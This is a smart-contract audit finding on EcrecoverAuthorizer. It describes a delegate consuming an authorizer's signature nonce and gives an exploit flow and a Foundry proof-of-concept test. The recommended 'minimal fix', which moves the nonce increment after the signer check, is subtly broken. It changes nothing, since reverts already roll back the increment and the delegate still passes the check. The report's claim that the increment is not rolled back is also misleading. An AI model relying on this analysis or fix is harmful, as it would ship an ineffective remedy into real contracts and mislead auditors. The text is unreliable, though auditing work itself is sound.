Audit Report

## Title
Authorized Delegate Can Consume Authorizer's Nonce via Delegated Signature, Permanently Blocking EcrecoverAuthorizer Usage — (`src/periphery/EcrecoverAuthorizer.sol`)

## Summary
`EcrecoverAuthorizer.setIsAuthorized` increments `nonce[authorization.authorizer]` before verifying the signer's identity, and the signer check accepts any address for which `IMidnight.isAuthorized(authorizer, signer)` returns `true`. An attacker who holds any Midnight authorization from a victim can construct and sign an `Authorization` struct naming the victim as `authorizer`, successfully consuming the victim's nonce and invalidating any pending victim-signed authorizations at that nonce. The attack is free, repeatable every block, and can permanently prevent the victim from using the EcrecoverAuthorizer path.

## Finding Description
In `src/periphery/EcrecoverAuthorizer.sol` lines 24–47:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // (1) nonce consumed unconditionally

    // ... digest computation ...
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // (2) delegate accepted
        Unauthorized()
    );
    IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
}
```

At step (1), `nonce[authorization.authorizer]` is post-incremented before the signer is identified. At step (2), the check accepts any `signer` for whom `isAuthorized[victim][signer] == true` on Midnight — a flat, permissionless mapping (`src/Midnight.sol` line 192). The nonce increment is not rolled back if the signer is a delegate rather than the authorizer themselves.

**Exploit flow:**

1. Preconditions: `isAuthorized[victim][attacker] == true` and `isAuthorized[victim][EcrecoverAuthorizer] == true` on Midnight; victim has a pending off-chain signed `Authorization{authorizer=victim, ..., nonce=N}`.
2. Attacker constructs `Authorization{authorizer=victim, authorized=<any third address>, isAuthorized=<any>, nonce=N, deadline=<future>}` and signs it with the **attacker's own key**.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
4. Line 26: `N == nonce[victim]` → passes; `nonce[victim]` becomes `N+1`.
5. Lines 33–36: `signer == victim` → false; `isAuthorized[victim][attacker]` → true → passes.
6. Line 46–47: `IMidnight.setIsAuthorized(thirdAddress, <any>, victim)` executes successfully.
7. Victim's nonce is now `N+1`; any pending victim-signed authorization at nonce `N` reverts with `InvalidNonce`.

The attacker sets `authorized` to a third address (not themselves), so they do not lose their own authorization and can repeat for nonces `N+1`, `N+2`, etc.

The existing `testEcrecoverAuthorizerInvalidSignature` test (`test/SetIsAuthorizedWithSigTest.sol` lines 88–97) only verifies that a completely unauthorized signer is rejected; it does not test the case where the signer is an authorized delegate of the authorizer, leaving this path untested.

## Impact Explanation
An attacker holding any Midnight authorization from the victim can grief the victim's `EcrecoverAuthorizer` nonce sequence indefinitely. Any off-chain signed authorizations the victim has distributed (e.g., to revoke a malicious operator or grant a new one) are rendered permanently invalid. If the victim is a smart contract that relies solely on the EIP-712 signature flow through `EcrecoverAuthorizer`, they lose all ability to manage their Midnight authorizations — a permanent freeze of a critical authorization management path. This constitutes unauthorized state corruption and permanent service degradation for the victim.

## Likelihood Explanation
Preconditions are common: any user who has ever authorized an operator on Midnight (e.g., a keeper, ratifier, or liquidation bot) while also having authorized `EcrecoverAuthorizer` is vulnerable. The attacker requires no capital, no special timing, and no privileged access — only a pre-existing authorization from the victim. The attack is executable every block, front-runnable against any victim-submitted `setIsAuthorized` transaction, and costs only gas.

## Recommendation
Move the nonce increment to after the signer authorization check, or restrict the signer check to `signer == authorization.authorizer` only (removing the delegate path). If delegate submission is desired, the delegate should submit a signature produced by the authorizer, not their own signature — the current design conflates "who can submit" with "who can sign," which breaks the nonce's replay-protection guarantee. A minimal fix:

```solidity
// Verify signer BEFORE consuming the nonce
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
require(signer != address(0), InvalidSignature());
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

This ensures the nonce is only consumed when the signer check has already passed, preventing unauthorized nonce consumption. Alternatively, restrict signing to `signer == authorization.authorizer` only, since the permissionless `msg.sender` submission already allows anyone to relay a victim-signed authorization.

## Proof of Concept
Minimal Foundry test (extending `EcrecoverAuthorizerTest`):

```solidity
function testDelegateConsumesVictimNonce() public {
    // Setup: victim authorizes EcrecoverAuthorizer and attacker on Midnight
    vm.startPrank(borrower); // borrower = victim
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
    midnight.setIsAuthorized(lender, true, borrower); // lender = attacker
    vm.stopPrank();

    // Victim prepares an off-chain authorization at nonce 0
    Authorization memory victimAuth = makeAuthorization(borrower, otherLender, true);
    Signature memory victimSig = signAuthorization(victimAuth, borrower);

    // Attacker constructs their own auth naming victim as authorizer, signs with attacker key
    Authorization memory attackAuth = Authorization({
        authorizer: borrower,
        authorized: otherLender, // any third address
        isAuthorized: false,
        nonce: 0,
        deadline: vm.getBlockTimestamp() + 1 days
    });
    Signature memory attackSig = signAuthorization(attackAuth, lender); // attacker signs

    // Attacker submits — consumes victim's nonce 0
    ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);
    assertEq(ecrecoverAuthorizer.nonce(borrower), 1); // nonce consumed

    // Victim's pending authorization at nonce 0 is now invalid
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
```
